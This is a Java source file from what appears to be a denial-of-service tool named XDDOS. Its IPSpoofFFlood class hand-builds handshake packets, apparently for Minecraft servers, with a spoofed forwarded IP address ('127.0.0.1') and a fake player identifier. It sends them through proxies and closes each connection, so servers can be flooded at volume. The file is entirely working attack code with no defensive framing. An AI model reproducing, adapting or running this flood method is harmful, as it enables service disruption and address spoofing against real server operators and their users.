package XD.XDDOS.methods.impl;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;

public class IPSpoofFFlood implements IMethod {
  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
    while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    }
    out.writeByte(paramInt);
  }

  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      out.writeByte(59);
      out.writeByte(0);
      writeVarInt(out, XDDOS.protcolID);
      out.writeByte(52);
      out.writeByte(49);
      out.writeByte(50);
      out.writeByte(55);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(49);
      out.writeByte(0);
      out.writeByte(49);
      out.writeByte(50);
      out.writeByte(55);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(49);
      out.writeByte(0);
      out.writeByte(98);
      out.writeByte(57);
      out.writeByte(55);
      out.writeByte(51);
      out.writeByte(98);
      out.writeByte(102);
      out.writeByte(99);
      out.writeByte(49);
      out.writeByte(56);
      out.writeByte(56);
      out.writeByte(55);
      out.writeByte(99);
      out.writeByte(51);
      out.writeByte(53);
      out.writeByte(52);
      out.writeByte(51);
      out.writeByte(97);
      out.writeByte(54);
      out.writeByte(50);
      out.writeByte(57);
      out.writeByte(56);
      out.writeByte(53);
      out.writeByte(53);
      out.writeByte(57);
      out.writeByte(50);
      out.writeByte(48);
      out.writeByte(49);
      out.writeByte(100);
      out.writeByte(99);
      out.writeByte(48);
      out.writeByte(49);
      out.writeByte(50);
      out.writeByte(99);
      out.writeByte(99);
      out.writeByte(233);
      out.writeByte(2);
      out.writeByte(13);
      out.writeByte(0);
      out.writeByte(11);
      out.writeBytes("12345678901");
      out.close();
    } catch (IOException e) {
      e.printStackTrace();
    }
    channel.writeAndFlush(b);
    NettyBootstrap.totalConnections++;
    NettyBootstrap.integer++;
    channel.close();
  }
}
